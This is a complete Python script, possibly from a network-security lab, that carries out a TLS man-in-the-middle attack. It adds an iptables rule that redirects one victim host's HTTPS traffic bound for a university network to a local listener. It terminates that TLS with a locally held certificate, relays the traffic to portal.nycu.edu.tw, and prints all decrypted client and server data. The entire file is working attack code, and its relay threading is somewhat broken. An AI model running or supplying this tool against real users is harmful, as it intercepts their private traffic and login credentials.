import ssl
import socket
import threading
import subprocess
def add_iptables_rule():
    rule = (
        "iptables -t nat -A PREROUTING -s 192.168.75.129 "
        "-d 140.113.0.0/16 -p tcp --dport 443 -j REDIRECT --to-ports 443"
    )

    try:
        subprocess.run(rule, shell=True, check=True)
        print("iptables rule added successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error adding iptables rule: {e}")

def handle_client(client_socket, server_socket):
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            print(f"Received from client: {data}")
            server_socket.send(data)
            response = server_socket.recv(4096)
            if not response:
                break
            print(f"Received from server: {response}")
            client_socket.send(response)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        server_socket.close()

def start_mitm_server():
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="certificates/host.crt", keyfile="certificates/host.key")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 443))
    server_socket.listen(5)
    print("MITM server listening on port 443")

    try:
        while True:
            try:
                client_socket, addr = server_socket.accept()
                print(f"Accepted connection from {addr}")
                ssl_client_socket = context.wrap_socket(client_socket, server_side=True)

                real_server_socket = socket.create_connection(('portal.nycu.edu.tw', 443))
                ssl_real_server_socket = ssl.create_default_context().wrap_socket(real_server_socket, server_hostname='portal.nycu.edu.tw')

                client_handler = threading.Thread(target=handle_client, args=(ssl_client_socket, ssl_real_server_socket))
                client_handler.start()
                server_handler = threading.Thread(target=handle_client, args=(ssl_real_server_socket, ssl_client_socket))
                server_handler.start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
    finally:
        server_socket.close()
add_iptables_rule()
start_mitm_server()